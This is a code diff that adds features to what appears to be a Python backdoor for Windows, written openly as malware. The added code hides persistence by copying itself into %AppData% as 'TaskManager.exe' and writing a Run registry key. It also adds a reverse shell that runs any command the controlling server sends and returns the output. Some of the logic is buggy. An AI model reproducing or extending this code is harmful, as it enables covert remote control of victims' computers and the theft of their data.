@@ -333,6 +333,7 @@ def system_information():
       out += "\n"
       return out
 
+
 # HELPER FUNCTIONS END
 
 
@@ -348,6 +349,23 @@ class Backdoor:
             sender_thread.setDaemon(True)
             sender_thread.start()
             sender_thread.join()
+
+      # Enable the backdoor to run on system startup by copying it to %AppData% 
+      # and adding a registry key to the Windows Registry
+      # @param:
+      #   - regName:  name of the registry key
+      #   - copyName: name of the copy of the backdoor stored in %AppData%
+      def enable_startup(self, regName, copyName):
+            filePath = os.environ['appdata'] + "\\" + copyName
+            
+            try:
+                  if os.path.exists(filePath): # If the file already exists, replace it
+                        shutil.copyfile(sys.executable, filePath)
+                        subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {regName} /t REG_SZ /d "{filePath}"', shell=True)
+                        send(self.sockfd, f'[+] Successfuly created persistence file with Reg Key: {regName}')
+      
+            except Exception as e:
+                  send(f'[-] Error: Unable to create persistence file: {e}')
 
       # Backdoor-Server interface
       def server_coms(self):
@@ -391,8 +409,27 @@ class Backdoor:
                         self.screenshare(port)
 
                   elif command == 'attempt-reconnect': # If the backdoor receives this command it means the server went offline.
-                        print("Server went offline")
                         break                          # The backdoor should go back to the start() loop and attempt a reconnect every 10 seconds
+
+                  elif command == 'enable-startup':
+                        self.enable_startup("TaskManager", "TaskManager.exe") # Random name to "hide" the backdoor
+                  
+                  else:
+                        # Attempt to run the command on the shell
+                        try:
+                              if command != 'cls': # clear screen bugs the reverse shell and freezes the backdoor bc process.stdout.read() is blocking
+                                    if command.startswith('cd '):
+                                        os.chdir(command[3:]) # cd has a different handling than other commands
+
+                                    else:
+                                          process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                                          out = process.stdout.read() + process.stderr.read()
+                                          send(self.sockfd, out.decode('utf-8'))
+                              else:
+                                    send(self.sockfd, '')
+                        
+                        except Exception as e:
+                              send(self.sockfd, f'[-] Error: {e}')
 
       def start(self):
             # Attempt to connect to the server every 10 seconds until a connection is established
@@ -411,7 +448,6 @@ class Backdoor:
       def run(self):
             while self.should_run:
                   self.start()
-                  print("Attempting to reconnect")
 
 
 if __name__ == '__main__':
